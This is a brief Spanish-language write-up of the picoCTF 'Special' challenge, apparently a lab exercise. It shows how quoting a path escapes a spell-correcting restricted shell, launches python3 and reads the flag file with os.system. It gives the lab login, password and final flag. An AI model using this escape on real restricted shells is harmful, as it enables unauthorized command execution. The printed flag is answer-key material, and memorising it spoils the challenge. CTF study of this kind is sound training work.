## Descripción 
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)

Start your instance to see connection details.

`ssh -p 65012 [ctf-player@saturn.picoctf.net](mailto:ctf-player@saturn.picoctf.net)`

The password is `d137d16e`
## Solución 
```
Son69-academy@webshell:~$ ssh -p 65012 ctf-player@saturn.picoctf.net
Special$ cat
Cat 
sh: 1: Cat: not found
Special$ ls 
Is 
sh: 1: Is: not found
Special$ special
Special 
sh: 1: Special: not found
Special$ 
Traceback (most recent call last):
  File "/usr/local/Special.py", line 19, in <module>
    elif cmd[0] == '/':
IndexError: string index out of range
Connection to saturn.picoctf.net closed.

Special$ "/usr/bin/python3"
"/usr/bin/python3" 
Python 3.8.10 (default, Nov 14 2022, 12:59:47) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system("ls -la")
total 0
drwxr-xr-x 1 ctf-player ctf-player 20 Aug 30 04:07 .
drwxr-xr-x 1 root       root       24 Mar 16  2023 ..
drwx------ 2 ctf-player ctf-player 34 Aug 30 04:07 .cache
drwxr-xr-x 2 ctf-player ctf-player 22 Mar 16  2023 blargh
>>> os.system("cat blargh/*")
picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794}0

```
## Notas adicionales 
* Al empezar con ", el programa ya no detecta que tu comando inicie con /, por lo que se supera la restricción de las rutas
## Referencias
* https://webshell.cylabacademy.org/
* Gemini